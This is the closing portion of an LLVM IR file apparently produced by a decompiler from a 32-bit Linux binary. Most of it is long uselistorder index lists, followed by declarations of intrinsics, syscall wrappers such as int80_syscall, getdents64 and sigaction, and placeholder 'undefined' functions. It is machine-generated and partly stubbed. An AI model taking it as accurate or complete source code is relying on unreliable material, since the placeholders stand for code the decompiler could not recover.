  uselistorder i32 -1, { 52, 139, 157, 266, 53, 54, 158, 55, 140, 151, 29, 30, 31, 159, 160, 23, 267, 161, 268, 269, 162, 56, 163, 289, 164, 165, 166, 167, 57, 168, 271, 272, 1, 2, 273, 274, 169, 128, 122, 124, 125, 126, 127, 123, 24, 121, 112, 170, 120, 129, 113, 130, 119, 131, 132, 133, 134, 135, 114, 115, 118, 0, 44, 152, 287, 288, 172, 171, 51, 25, 173, 174, 276, 277, 41, 35, 58, 175, 47, 176, 290, 177, 116, 59, 60, 178, 61, 179, 141, 180, 181, 48, 182, 136, 183, 43, 184, 185, 186, 63, 62, 187, 142, 188, 45, 189, 64, 65, 66, 190, 67, 68, 191, 42, 32, 33, 69, 70, 192, 71, 193, 194, 37, 72, 73, 195, 196, 197, 198, 199, 75, 74, 76, 200, 38, 201, 202, 298, 203, 204, 3, 299, 295, 6, 5, 7, 8, 9, 77, 10, 78, 11, 205, 4, 296, 26, 206, 207, 208, 12, 278, 281, 79, 209, 80, 210, 291, 211, 212, 279, 280, 213, 282, 283, 270, 36, 275, 300, 81, 143, 214, 215, 39, 216, 217, 218, 46, 219, 28, 292, 293, 34, 220, 221, 294, 222, 82, 223, 224, 225, 153, 154, 226, 227, 27, 117, 83, 228, 13, 14, 84, 144, 284, 85, 265, 15, 86, 229, 87, 230, 88, 231, 89, 232, 49, 50, 233, 90, 234, 91, 235, 92, 236, 93, 237, 94, 238, 95, 239, 96, 240, 97, 241, 98, 242, 99, 243, 100, 244, 101, 245, 102, 246, 103, 247, 104, 248, 105, 249, 106, 250, 107, 251, 108, 252, 109, 253, 254, 255, 256, 257, 258, 145, 155, 146, 147, 156, 285, 286, 16, 259, 40, 110, 17, 111, 297, 18, 19, 260, 20, 264, 21, 22, 137, 138, 261, 262, 263, 148, 149, 150 }
  uselistorder i32 192, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 2, { 92, 121, 122, 33, 59, 96, 97, 36, 0, 1, 93, 98, 99, 100, 88, 101, 102, 103, 104, 105, 106, 41, 130, 60, 61, 123, 42, 62, 39, 131, 132, 124, 125, 55, 107, 108, 109, 110, 34, 35, 2, 3, 4, 5, 6, 126, 127, 43, 128, 63, 64, 82, 129, 44, 133, 134, 56, 16, 17, 47, 48, 111, 65, 66, 67, 68, 69, 70, 71, 45, 87, 15, 72, 83, 73, 84, 74, 85, 40, 18, 91, 37, 19, 20, 49, 21, 22, 50, 141, 23, 24, 57, 25, 75, 114, 115, 116, 117, 7, 51, 89, 118, 119, 112, 113, 8, 76, 94, 95, 26, 143, 52, 9, 10, 135, 136, 46, 27, 28, 137, 38, 29, 138, 30, 53, 139, 140, 31, 120, 54, 58, 142, 11, 12, 13, 14, 77, 32, 90, 78, 80, 79, 86, 81 }
  uselistorder i1 false, { 147, 6, 149, 148, 260, 34, 8, 35, 158, 153, 157, 155, 156, 44, 150, 151, 154, 7, 159, 160, 165, 166, 167, 281, 286, 284, 285, 282, 45, 283, 402, 403, 261, 262, 9, 263, 264, 270, 271, 10, 126, 127, 128, 46, 168, 272, 287, 288, 289, 290, 291, 292, 404, 176, 36, 11, 171, 172, 173, 174, 175, 189, 190, 37, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 4, 13, 161, 162, 164, 163, 12, 266, 267, 268, 269, 265, 273, 274, 408, 405, 407, 406, 47, 275, 276, 277, 278, 279, 280, 14, 129, 130, 131, 132, 293, 294, 295, 218, 219, 179, 180, 181, 296, 297, 298, 299, 300, 301, 302, 58, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 182, 183, 184, 327, 328, 439, 440, 43, 177, 38, 178, 3, 329, 48, 71, 330, 331, 441, 442, 443, 115, 0, 116, 427, 438, 444, 89, 133, 134, 135, 137, 138, 139, 72, 140, 141, 142, 143, 144, 145, 15, 251, 16, 253, 254, 450, 451, 454, 455, 492, 493, 494, 466, 467, 468, 469, 470, 471, 460, 461, 462, 463, 464, 465, 459, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 32, 420, 419, 424, 421, 422, 423, 17, 425, 426, 136, 495, 220, 221, 223, 224, 225, 226, 228, 227, 203, 204, 210, 39, 205, 206, 208, 207, 211, 212, 217, 216, 213, 214, 215, 5, 18, 1, 507, 152, 332, 333, 49, 334, 19, 222, 229, 169, 170, 209, 335, 230, 231, 232, 233, 234, 235, 236, 187, 185, 186, 20, 40, 237, 239, 238, 50, 240, 242, 241, 51, 243, 188, 59, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 356, 355, 21, 357, 358, 359, 360, 361, 363, 33, 364, 362, 365, 367, 366, 22, 368, 369, 371, 370, 52, 372, 373, 374, 375, 376, 73, 377, 378, 81, 82, 379, 83, 84, 380, 381, 85, 382, 383, 74, 86, 384, 385, 386, 387, 388, 75, 389, 76, 87, 77, 390, 78, 391, 392, 393, 79, 394, 80, 395, 88, 396, 397, 398, 399, 400, 445, 53, 449, 23, 244, 245, 246, 247, 248, 249, 109, 110, 124, 125, 401, 250, 41, 117, 118, 119, 146, 429, 436, 437, 497, 446, 447, 448, 487, 491, 498, 255, 60, 61, 256, 24, 430, 431, 432, 25, 434, 435, 428, 54, 433, 479, 458, 2, 472, 55, 480, 456, 499, 63, 64, 488, 489, 56, 490, 62, 500, 26, 501, 65, 503, 504, 505, 66, 506, 67, 496, 502, 481, 27, 486, 68, 483, 482, 28, 484, 29, 69, 485, 473, 474, 475, 457, 452, 42, 453, 257, 258, 57, 476, 477, 478, 508, 100, 90, 91, 92, 30, 93, 94, 95, 96, 97, 98, 99, 70, 101, 102, 103, 104, 105, 106, 107, 108, 111, 112, 113, 114, 122, 120, 121, 31, 123, 252, 259, 509 }
  uselistorder i8 0, { 29, 3, 53, 54, 5, 61, 56, 57, 4, 59, 60, 58, 23, 62, 0, 1, 7, 47, 46, 6, 30, 63, 102, 103, 10, 70, 66, 67, 65, 8, 68, 69, 9, 24, 71, 72, 76, 77, 78, 79, 84, 13, 14, 31, 12, 11, 101, 16, 49, 48, 15, 50, 51, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 2, 120, 121, 122, 175, 73, 123, 32, 39, 27, 28, 52, 17, 184, 179, 180, 158, 159, 160, 161, 162, 163, 33, 164, 86, 87, 80, 81, 25, 83, 18, 55, 124, 125, 40, 126, 85, 88, 64, 82, 89, 74, 75, 90, 91, 92, 127, 128, 129, 130, 131, 132, 133, 19, 134, 135, 20, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 22, 149, 150, 151, 152, 153, 154, 155, 156, 176, 93, 94, 95, 100, 157, 96, 97, 26, 185, 165, 166, 167, 170, 168, 169, 21, 171, 172, 174, 173, 183, 178, 181, 177, 182, 43, 41, 42, 44, 45, 98, 99, 34, 35, 36, 37, 38 }
  uselistorder i32 1, { 759, 269, 760, 285, 761, 762, 69, 36, 35, 34, 257, 286, 287, 763, 271, 263, 766, 386, 767, 768, 769, 270, 770, 0, 407, 176, 175, 771, 772, 418, 417, 219, 218, 220, 775, 419, 776, 420, 221, 777, 778, 421, 223, 222, 224, 424, 423, 422, 139, 388, 1, 351, 389, 387, 428, 427, 426, 425, 865, 429, 81, 82, 80, 83, 430, 225, 748, 749, 750, 288, 751, 779, 780, 781, 431, 227, 226, 228, 354, 432, 53, 125, 289, 290, 54, 55, 56, 320, 2, 434, 433, 50, 435, 194, 33, 436, 355, 437, 258, 782, 783, 264, 784, 291, 272, 785, 787, 789, 790, 791, 792, 793, 292, 440, 439, 438, 799, 800, 801, 802, 803, 804, 805, 806, 3, 807, 293, 808, 809, 810, 294, 811, 812, 295, 826, 827, 828, 829, 830, 356, 415, 442, 441, 37, 38, 259, 260, 773, 265, 774, 214, 174, 321, 866, 867, 4, 443, 119, 118, 279, 280, 281, 282, 283, 5, 444, 148, 149, 322, 323, 6, 445, 68, 7, 229, 447, 446, 199, 448, 57, 58, 450, 449, 408, 184, 357, 454, 453, 452, 451, 868, 455, 456, 461, 460, 459, 458, 457, 129, 130, 463, 462, 752, 753, 754, 464, 161, 465, 869, 466, 133, 134, 324, 794, 409, 230, 359, 870, 871, 872, 296, 358, 467, 873, 874, 875, 297, 876, 877, 479, 478, 477, 476, 475, 474, 473, 472, 471, 470, 469, 468, 240, 233, 232, 234, 239, 237, 231, 238, 235, 236, 878, 879, 8, 111, 110, 109, 108, 107, 480, 241, 242, 481, 71, 70, 795, 482, 880, 881, 483, 191, 190, 192, 941, 942, 943, 484, 166, 164, 165, 298, 485, 136, 882, 486, 30, 29, 32, 27, 28, 31, 325, 326, 489, 488, 487, 490, 25, 26, 24, 491, 185, 492, 147, 493, 153, 154, 151, 152, 299, 144, 495, 494, 496, 182, 498, 497, 146, 499, 122, 501, 500, 243, 327, 390, 729, 9, 507, 506, 505, 504, 503, 502, 137, 138, 360, 508, 755, 756, 757, 758, 509, 95, 94, 96, 92, 93, 328, 860, 730, 266, 861, 391, 862, 410, 510, 90, 89, 88, 91, 511, 101, 99, 98, 103, 102, 100, 361, 513, 512, 362, 516, 515, 514, 392, 519, 518, 517, 244, 363, 954, 955, 956, 520, 141, 142, 949, 950, 273, 951, 952, 953, 105, 104, 393, 948, 300, 245, 246, 248, 247, 364, 521, 113, 365, 914, 915, 916, 917, 918, 919, 920, 921, 922, 301, 923, 924, 925, 926, 927, 331, 928, 929, 256, 332, 930, 931, 932, 933, 329, 330, 934, 935, 936, 524, 523, 522, 178, 180, 177, 179, 181, 525, 333, 334, 526, 335, 336, 302, 394, 527, 528, 529, 530, 531, 532, 831, 10, 832, 366, 284, 367, 836, 11, 537, 536, 535, 534, 533, 75, 76, 538, 539, 337, 338, 837, 838, 839, 840, 274, 339, 813, 814, 261, 396, 815, 816, 303, 817, 352, 819, 820, 540, 51, 340, 821, 825, 822, 823, 824, 275, 543, 542, 541, 158, 159, 157, 546, 545, 544, 23, 547, 786, 548, 135, 764, 765, 883, 884, 416, 549, 145, 885, 833, 834, 835, 551, 550, 168, 167, 841, 842, 552, 87, 86, 85, 353, 788, 818, 968, 553, 78, 77, 79, 554, 555, 341, 843, 844, 845, 411, 186, 187, 796, 797, 798, 304, 123, 368, 369, 370, 846, 556, 371, 372, 847, 305, 12, 558, 557, 249, 373, 559, 886, 887, 731, 307, 888, 889, 890, 891, 892, 894, 895, 896, 308, 897, 898, 395, 306, 899, 309, 900, 901, 902, 893, 563, 562, 561, 560, 64, 66, 65, 61, 62, 63, 67, 903, 564, 173, 170, 172, 171, 310, 565, 904, 905, 567, 566, 59, 60, 906, 907, 732, 733, 342, 908, 343, 909, 910, 911, 311, 912, 374, 913, 570, 569, 568, 39, 43, 41, 40, 42, 13, 375, 571, 344, 572, 573, 213, 212, 944, 575, 574, 250, 376, 576, 377, 577, 848, 849, 850, 851, 852, 853, 854, 855, 856, 582, 581, 580, 579, 578, 198, 585, 584, 583, 160, 586, 587, 588, 121, 378, 747, 589, 379, 857, 858, 380, 381, 859, 591, 590, 382, 312, 593, 592, 594, 345, 597, 596, 595, 383, 598, 600, 599, 602, 601, 120, 603, 150, 604, 84, 605, 97, 606, 114, 607, 126, 608, 128, 609, 183, 610, 163, 611, 112, 52, 612, 189, 613, 162, 615, 614, 188, 617, 616, 193, 618, 143, 619, 208, 620, 209, 621, 156, 622, 155, 623, 624, 251, 625, 169, 626, 46, 627, 127, 124, 628, 632, 631, 630, 629, 106, 937, 938, 14, 15, 16, 633, 963, 634, 946, 635, 140, 346, 313, 638, 637, 636, 196, 195, 397, 945, 640, 639, 210, 211, 398, 947, 642, 641, 131, 132, 384, 643, 252, 939, 940, 647, 646, 645, 644, 648, 649, 197, 651, 650, 116, 115, 117, 654, 653, 652, 200, 201, 656, 655, 72, 73, 657, 74, 659, 658, 45, 44, 660, 204, 206, 205, 207, 663, 662, 661, 664, 665, 666, 668, 667, 670, 669, 671, 673, 672, 674, 675, 677, 676, 679, 678, 681, 680, 683, 682, 350, 314, 684, 203, 202, 964, 965, 966, 399, 967, 217, 216, 215, 347, 962, 686, 685, 49, 48, 687, 17, 18, 19, 20, 689, 688, 47, 400, 961, 276, 690, 691, 253, 957, 348, 958, 959, 960, 692, 254, 693, 695, 694, 696, 315, 21, 22, 316, 697, 385, 699, 698, 700, 255, 702, 701, 703, 706, 705, 704, 734, 277, 735, 278, 736, 737, 318, 738, 739, 740, 349, 317, 401, 319, 741, 742, 743, 262, 267, 713, 712, 711, 710, 709, 708, 707, 412, 402, 714, 403, 404, 405, 406, 715, 720, 719, 718, 717, 716, 744, 745, 746, 723, 722, 721, 725, 413, 724, 268, 726, 863, 864, 727, 414, 728 }
  uselistorder i32* @ecx, { 33, 5, 64, 15, 65, 66, 67, 68, 16, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 122, 134, 6, 54, 1, 55, 85, 17, 7, 136, 137, 138, 139, 124, 125, 9, 20, 86, 18, 8, 19, 87, 92, 93, 94, 95, 96, 11, 32, 10, 126, 127, 128, 34, 123, 129, 35, 201, 200, 199, 130, 131, 132, 133, 12, 56, 2, 57, 140, 141, 39, 40, 41, 142, 90, 91, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 36, 168, 169, 170, 171, 37, 172, 31, 50, 231, 58, 21, 60, 61, 62, 63, 118, 119, 117, 120, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 22, 249, 235, 236, 228, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 23, 221, 222, 224, 225, 226, 227, 223, 268, 59, 99, 100, 101, 102, 103, 104, 105, 107, 108, 109, 110, 111, 97, 98, 13, 0, 42, 24, 106, 43, 44, 112, 113, 173, 174, 175, 176, 177, 178, 179, 38, 180, 14, 181, 182, 183, 184, 185, 25, 26, 3, 4, 186, 187, 27, 188, 189, 190, 191, 192, 194, 195, 196, 197, 193, 198, 232, 114, 52, 51, 260, 261, 269, 115, 88, 89, 274, 262, 135, 233, 275, 276, 230, 270, 121, 234, 229, 277, 116, 53, 49, 266, 28, 267, 272, 273, 271, 263, 264, 265, 30, 29, 46, 47, 48, 45 }
  uselistorder i32 0, { 1004, 1007, 1005, 1006, 830, 0, 831, 22, 52, 1010, 1018, 1012, 1013, 23, 42, 1014, 1015, 1016, 832, 1017, 51, 107, 108, 109, 1008, 1009, 113, 1019, 1020, 1022, 1023, 1021, 1024, 221, 1026, 1027, 1028, 1029, 1030, 1031, 114, 1166, 1210, 268, 1211, 1214, 1213, 196, 214, 273, 274, 269, 270, 271, 272, 1431, 1432, 115, 1167, 1168, 1169, 1170, 53, 54, 55, 833, 116, 117, 1172, 118, 1186, 1187, 834, 1188, 24, 56, 980, 92, 93, 835, 1032, 57, 836, 1189, 837, 1215, 1218, 1219, 18, 222, 120, 119, 1220, 1221, 223, 1222, 1223, 838, 1224, 1225, 1226, 1227, 121, 839, 1, 122, 1190, 123, 275, 1038, 1033, 1034, 1035, 1037, 102, 25, 1051, 1052, 1053, 1054, 1055, 1056, 1062, 1063, 1064, 1065, 1057, 1058, 1059, 1060, 1061, 58, 59, 840, 1066, 1067, 60, 61, 62, 841, 1068, 1069, 1070, 1071, 1072, 1074, 1075, 1076, 1085, 1086, 1087, 1088, 1089, 1090, 1091, 1092, 1093, 1094, 26, 19, 20, 99, 63, 842, 1025, 125, 843, 124, 1173, 1174, 844, 1181, 1182, 1183, 821, 1184, 94, 1175, 1176, 1177, 1178, 822, 2, 1179, 1180, 126, 1192, 823, 1191, 1438, 127, 1434, 1435, 1436, 128, 1437, 129, 197, 130, 1185, 3, 1193, 1194, 1195, 1196, 1197, 1198, 1199, 224, 845, 1201, 1202, 1203, 131, 1204, 1205, 1206, 132, 805, 1207, 1208, 1209, 1439, 1440, 103, 225, 110, 846, 104, 1228, 133, 1229, 27, 105, 95, 1230, 198, 134, 1231, 96, 1232, 1039, 1043, 1044, 276, 1045, 847, 1233, 277, 1234, 1235, 1236, 1237, 1238, 1239, 1240, 135, 848, 1241, 1242, 1243, 1244, 136, 1245, 849, 190, 278, 137, 850, 851, 852, 138, 1246, 226, 1247, 1248, 1249, 1250, 227, 263, 264, 1251, 1252, 1253, 1254, 1255, 1256, 853, 228, 1257, 97, 854, 1258, 139, 229, 230, 1259, 1260, 279, 1046, 1047, 1048, 855, 1261, 1262, 1263, 1264, 88, 1483, 1484, 1485, 1486, 1487, 1488, 1489, 1490, 4, 199, 856, 1040, 1042, 857, 1265, 106, 1266, 200, 858, 859, 1267, 140, 1268, 956, 957, 141, 947, 1491, 1492, 1493, 280, 1494, 948, 958, 959, 960, 961, 928, 1433, 281, 1495, 1441, 1467, 1482, 1496, 1497, 1498, 64, 927, 820, 142, 860, 981, 231, 232, 143, 982, 983, 144, 145, 985, 984, 986, 989, 282, 806, 990, 992, 991, 993, 1511, 994, 995, 996, 997, 861, 862, 998, 999, 1000, 146, 863, 1140, 65, 1141, 1142, 1143, 1144, 1145, 5, 864, 1148, 147, 1519, 807, 148, 233, 1572, 1575, 1574, 1533, 234, 1536, 1527, 1528, 1529, 235, 1530, 1531, 1532, 283, 1525, 284, 1526, 285, 1442, 1443, 1444, 1445, 1446, 1447, 1448, 1449, 1450, 236, 237, 1451, 865, 1466, 866, 867, 286, 808, 868, 287, 809, 149, 869, 1452, 1453, 150, 151, 288, 810, 112, 45, 46, 1454, 1455, 1456, 1457, 1458, 1459, 152, 153, 289, 811, 111, 1460, 201, 1461, 100, 1462, 1463, 1465, 870, 1464, 6, 1576, 7, 1573, 987, 988, 1577, 1578, 1579, 1095, 871, 238, 1096, 872, 1097, 1098, 1099, 1101, 1102, 1103, 1104, 1105, 1106, 1107, 1108, 1109, 154, 1110, 1111, 155, 1112, 1113, 1114, 66, 156, 873, 1079, 874, 1077, 215, 1078, 290, 291, 157, 158, 875, 876, 1080, 1081, 1082, 1083, 1084, 292, 877, 878, 239, 1602, 1604, 159, 1036, 1011, 8, 160, 1269, 1270, 293, 1271, 161, 879, 1272, 202, 1273, 67, 1100, 28, 47, 240, 241, 162, 1274, 1275, 1276, 1115, 1116, 1117, 1118, 163, 1049, 68, 880, 1119, 881, 1121, 1120, 203, 882, 883, 1122, 1124, 1123, 204, 884, 1050, 1277, 1278, 1279, 1280, 1281, 1282, 1283, 1284, 1285, 1286, 1287, 1288, 164, 885, 1289, 242, 1290, 1291, 1292, 1293, 1294, 29, 30, 886, 217, 218, 1295, 1296, 1297, 1298, 31, 1299, 1300, 1301, 32, 887, 1302, 33, 34, 165, 888, 1303, 1304, 1305, 1308, 1306, 1307, 35, 48, 69, 1309, 1310, 1311, 1312, 265, 1313, 1314, 166, 1315, 1316, 1317, 1318, 1319, 1320, 1321, 1322, 168, 1323, 1324, 1325, 889, 1326, 1327, 205, 206, 1328, 1329, 1330, 169, 167, 1331, 170, 1332, 1333, 890, 1334, 1335, 1336, 1337, 1338, 1339, 1340, 1342, 1343, 1344, 1345, 1346, 1347, 1348, 1349, 1350, 1351, 1352, 171, 891, 892, 172, 1353, 1354, 1355, 893, 894, 1356, 1357, 1358, 1359, 1360, 1361, 1362, 1363, 895, 896, 1364, 1365, 1366, 1367, 1368, 1369, 1370, 1371, 1372, 1373, 1374, 1375, 1376, 1377, 1378, 897, 1379, 1380, 1381, 1382, 1383, 1384, 1385, 1386, 1387, 1388, 1389, 1390, 1391, 243, 898, 244, 1392, 1393, 1394, 1395, 1396, 1397, 1398, 1399, 1400, 1401, 1402, 1403, 1404, 245, 1405, 1406, 1407, 1408, 1409, 1410, 1411, 36, 70, 71, 72, 73, 1412, 1413, 1414, 1415, 1416, 1417, 173, 1418, 899, 1419, 1420, 1421, 1422, 812, 1423, 1424, 1425, 1426, 1427, 1428, 101, 43, 89, 1341, 207, 1429, 1430, 1499, 1500, 208, 1510, 1501, 74, 900, 1125, 1126, 1127, 1128, 1129, 1130, 1131, 1132, 1133, 1134, 246, 1135, 174, 901, 902, 1136, 1165, 949, 979, 175, 1137, 903, 1138, 962, 963, 904, 905, 964, 965, 966, 967, 968, 969, 970, 971, 906, 1537, 176, 1001, 1146, 1580, 1581, 1139, 1538, 953, 1041, 1073, 1599, 1539, 1524, 1216, 1217, 1582, 1603, 1200, 1002, 977, 1171, 1003, 978, 1149, 1212, 1512, 1600, 1601, 1513, 177, 1514, 9, 1471, 247, 1475, 907, 1481, 178, 179, 180, 1585, 908, 1598, 824, 1596, 1597, 825, 1502, 1504, 1505, 909, 1509, 826, 1507, 1508, 827, 181, 182, 1564, 1565, 1568, 1571, 828, 1569, 1570, 829, 1586, 266, 1150, 1151, 1152, 294, 183, 10, 11, 12, 910, 1156, 1157, 1158, 1159, 191, 1503, 295, 75, 192, 1506, 296, 76, 1160, 77, 184, 1476, 911, 912, 913, 1477, 1479, 1480, 13, 1469, 1468, 209, 1470, 914, 44, 1478, 14, 915, 1153, 1154, 1155, 185, 916, 1555, 1523, 1473, 1474, 1472, 1534, 1535, 1540, 1541, 210, 1556, 1161, 1162, 1520, 1587, 248, 249, 250, 251, 252, 253, 254, 255, 256, 15, 1566, 1567, 37, 211, 297, 1588, 1589, 78, 79, 1590, 1591, 917, 1593, 1594, 918, 298, 919, 1595, 91, 260, 1583, 1584, 1592, 1557, 1563, 299, 920, 1558, 1562, 193, 921, 813, 1559, 1560, 1561, 80, 922, 1542, 1543, 923, 212, 82, 1544, 1545, 83, 1546, 924, 81, 1547, 1548, 1549, 925, 16, 1550, 186, 1521, 187, 1522, 926, 188, 1515, 189, 1516, 1517, 1518, 98, 257, 1163, 1164, 213, 300, 301, 814, 1551, 1552, 258, 1553, 1554, 1605, 194, 307, 815, 929, 930, 931, 932, 933, 38, 39, 84, 216, 90, 195, 303, 934, 40, 49, 935, 306, 41, 50, 302, 304, 261, 936, 309, 310, 816, 305, 308, 817, 937, 938, 818, 311, 312, 313, 314, 315, 316, 939, 940, 85, 819, 941, 942, 943, 944, 945, 946, 329, 330, 317, 318, 319, 320, 321, 322, 950, 323, 324, 951, 952, 325, 326, 327, 328, 86, 219, 220, 262, 954, 955, 975, 972, 973, 974, 331, 332, 87, 976, 17, 267, 21, 1147, 259, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 797, 798, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 799, 800, 801, 802, 803, 804, 1606, 1607, 1608, 1609, 1610, 1611, 1612, 1613 }
  uselistorder i32 %arg2, { 4, 0, 1, 2, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80684b1, { 1, 0 }
  uselistorder label %dec_label_pc_80684ad, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8068491, { 1, 0 }
}

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #1

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

declare i32 @_strlen(i8*) local_unnamed_addr

declare i8* @_memset(i8*, i32, i32) local_unnamed_addr

declare i8* @_memcpy(i8*, i8*, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare i32 @unknown_0(i32) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @int80_syscall(i32) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare i32 @getpid(i32) local_unnamed_addr

declare i32 @poll(%pollfd*, i32, i32) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @sigsuspend(%_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @clock_getres(i32, %timespec*) local_unnamed_addr

declare i32 @getdents64(i32, %linux_dirent64*, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8* @__decompiler_undefined_function_1() local_unnamed_addr

declare i64 @__decompiler_undefined_function_2() local_unnamed_addr

declare i16 @__decompiler_undefined_function_3() local_unnamed_addr

declare i8 @__decompiler_undefined_function_4() local_unnamed_addr

declare %sigaction* @__decompiler_undefined_function_5() local_unnamed_addr

declare %pollfd* @__decompiler_undefined_function_6() local_unnamed_addr

declare %_TYPEDEF_sigset_t* @__decompiler_undefined_function_7() local_unnamed_addr

declare i16* @__decompiler_undefined_function_8() local_unnamed_addr

declare %timespec* @__decompiler_undefined_function_9() local_unnamed_addr

declare x86_fp80 @__decompiler_undefined_function_10() local_unnamed_addr

; Function Attrs: noreturn nounwind
declare void @llvm.trap() #2

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
attributes #2 = { noreturn nounwind }
